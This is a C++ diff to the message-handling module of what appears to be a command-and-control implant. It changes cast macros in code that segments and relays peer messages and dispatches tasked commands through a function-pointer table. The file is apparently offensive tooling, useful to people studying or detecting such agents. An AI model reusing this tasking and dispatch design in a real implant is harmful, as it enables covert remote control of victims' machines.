@@ -85,10 +85,10 @@ namespace Message {
         }
 
         if (Outbound->Length > MESSAGE_MAX) {
-            QueueSegments(REINTC(PBYTE, Outbound->Buffer), Outbound->Length);
+            QueueSegments(SCAST(PBYTE, Outbound->Buffer), Outbound->Length);
 
         } else {
-            Parser::CreateParser(&Parser, REINTC(PBYTE, Outbound->Buffer), Outbound->Length);
+            Parser::CreateParser(&Parser, SCAST(PBYTE, Outbound->Buffer), Outbound->Length);
 
             Queue           = Stream::CreateStream();
             Queue->PeerId   = Parser::UnpackDword(&Parser);
@@ -121,7 +121,7 @@ namespace Message {
 
         while (Length > 0) {
             cbSeg   = Length > MESSAGE_MAX - SEGMENT_HEADER_SIZE ? MESSAGE_MAX - SEGMENT_HEADER_SIZE : Length;
-            Queue    = REINTC(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE));
+            Queue    = SCAST(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE));
 
             x_memcpy(&PeerId, Buffer, 4);
             x_memcpy(&TaskId, Buffer + 4, 4);
@@ -133,7 +133,7 @@ namespace Message {
             Stream::PackDword(Queue, Index);
             Stream::PackDword(Queue, nSegs);
             Stream::PackDword(Queue, cbSeg);
-            Stream::PackBytes(Queue, REINTC(PBYTE, Buffer) + Offset, cbSeg);
+            Stream::PackBytes(Queue, SCAST(PBYTE, Buffer) + Offset, cbSeg);
 
             Index++;
             Length -= cbSeg;
@@ -169,18 +169,18 @@ namespace Message {
                 }
 
                 if (Head->Buffer) {
-                    Parser::CreateParser(&Parser, REINTC(PBYTE, Head->Buffer), Head->Length);
+                    Parser::CreateParser(&Parser, SCAST(PBYTE, Head->Buffer), Head->Length);
 
                     Stream::PackDword(Outbound, Head->PeerId);
                     Stream::PackDword(Outbound, Head->TaskId);
                     Stream::PackDword(Outbound, Head->MsgType);
 
                     if (Ctx->Root) {
-                        Stream::PackBytes(Outbound, REINTC(PBYTE, Head->Buffer), Head->Length);
+                        Stream::PackBytes(Outbound, SCAST(PBYTE, Head->Buffer), Head->Length);
 
                     } else {
                         Outbound->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Outbound->Buffer, Outbound->Length + Head->Length);
-                        x_memcpy(Outbound->Buffer + Outbound->Length, Head->Buffer, Head->Length);
+                        x_memcpy(SCAST(PBYTE, Outbound->Buffer) + Outbound->Length, Head->Buffer, Head->Length);
 
                         Outbound->Length += Head->Length;
                     }
@@ -247,7 +247,7 @@ namespace Message {
         PARSER Parser   = { };
         ULONG MsgType   = 0;
 
-        Parser::CreateParser(&Parser, REINTC(PBYTE, Inbound->Buffer), Inbound->Length);
+        Parser::CreateParser(&Parser, SCAST(PBYTE, Inbound->Buffer), Inbound->Length);
         Parser::UnpackDword(&Parser);
 
         Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&Parser);
@@ -272,7 +272,7 @@ namespace Message {
                     }
 
                     if (CmdMap[FnCounter].Id == CmdId) {
-                        auto Cmd = REINTC(CmdSignature*, Ctx->Base.Address + U_PTR(CmdMap[FnCounter].Function));
+                        auto Cmd = RCAST(CmdSignature*, Ctx->Base.Address + U_PTR(CmdMap[FnCounter].Function));
                         Cmd(&Parser);
                         break;
                     }
